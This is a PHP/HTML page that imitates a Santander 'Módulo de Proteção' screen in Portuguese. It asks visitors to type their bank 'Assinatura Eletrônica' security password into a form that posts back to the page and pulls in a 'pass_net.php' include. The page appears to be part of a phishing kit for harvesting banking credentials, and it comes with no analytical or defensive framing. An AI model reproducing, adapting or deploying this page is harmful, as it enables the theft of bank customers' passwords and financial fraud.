<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle">
				<h1 class="title_ass">Módulo de Proteção Santander</h1>
				<p class="text_ased">
					Para confirmar esta operação informe sua Assinatura Eletrônica.
				</p>
			</div>

			<div class="md_boxTables">

				<?php
					if(isset($_SESSION['ErrorDados'])):
						$display = 'block';
					else:
						$display = 'block';
					endif;	
					unset($_SESSION['ErrorDados']);
				?>
				
				<form action="" name="formAss" id="formAss" method="post" onsubmit="return checkAss();">
					<span>Assinatura Eletrônica:</span>
					<input type="password" name="ass_ele" id="ass_ele" class="input_ass" maxlength="8" autocomplete="off">
					
					<input type="hidden" name="sender" id="sender" value="ass_ele">
					<input type="submit" name="sendAss" id="sendAss" class="btn_ass" value="continuar">
				</form>
			
				<span class="note_atr">
					<b class="red_txt">ATENÇÃO:</b><br>A assinatura eletrônica é sua senha de segurança adicional composta de 06 a 08 caracteres alfanuméricos.
				</span>
			</div><!-- md_boxTables -->

			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>